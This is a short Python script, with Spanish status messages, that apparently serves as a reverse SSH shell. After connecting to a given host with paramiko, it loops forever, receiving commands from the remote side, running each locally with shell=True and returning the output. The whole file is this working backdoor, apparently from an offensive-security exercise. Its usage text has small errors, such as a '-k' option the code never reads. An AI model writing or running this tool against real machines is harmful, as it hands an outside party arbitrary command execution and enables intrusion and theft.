import subprocess
import paramiko
import sys
import getopt


def usage():
    print('Usage: ssh_client.py  <IP> -p <PORT> -u <USER> -c <COMMAND> -a <PASSWORD> -k <KEY> -c <COMMAND>')
    print('-a                  password authentication')
    print('-i                  identity file location')
    print('-c                  command to be issued')
    print('-p                  specify the port')
    print('-u                  specify the username')
    print()
    print('ssh_client.py <IP> -u <USER> -p 22 -a <GOODPASS> -c pwd')


def ssh_client(ip, port, user, passwd, key, command):
    client = paramiko.SSHClient()
    if key:
        client.load_host_keys(key)
    else:
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        print(ssh_session.recv(1024))
        while 1:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
        client.close()


def main():
    IP = "0.0.0.0"
    USER = ""
    PASSWORD = ""
    KEY = ""
    COMMAND = ""
    PORT = 0

    try:
        opts = getopt.getopt(sys.argv[2:], "p:u:a:i:c:", ['PORT', 'USER', 'PASSWORD', 'KEY', 'COMMAND'])[0]
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    IP = sys.argv[1]
    print(f'[*] Inicializando conexión a: {IP}')
    for t in opts:
        if t[0] in ('-a'):
            PASSWORD = t[1]
        elif t[0] in ('-i'):
            KEY = t[1]
        elif t[0] in ('-c'):
            COMMAND = t[1]
        elif t[0] in ('-p'):
            PORT = int(t[1])
        elif t[0] in ('-u'):
            USER = t[1]
        else:
            print('Esta opcion no existe')
            usage()

    if USER:
        print(f'[*] Usuario seteado a: {USER}')
    if PORT:
        print(f'[*] El puerto a ser usado es: {PORT}')
    if PASSWORD:
        print(f'[*] Contraseña con largo {len(PASSWORD)} ingresada.')
    if KEY:
        print(f'[*] La clave {KEY} será usada.')
    if COMMAND:
        print(f'[*] Ejecutando el comando {COMMAND} en el host...')
    else:
        print('Se necesita especificarle un comando al host.')
        usage()

    # Start the client.
    ssh_client(IP, PORT, USER, PASSWORD, KEY, COMMAND)


if __name__ == '__main__':
    main()
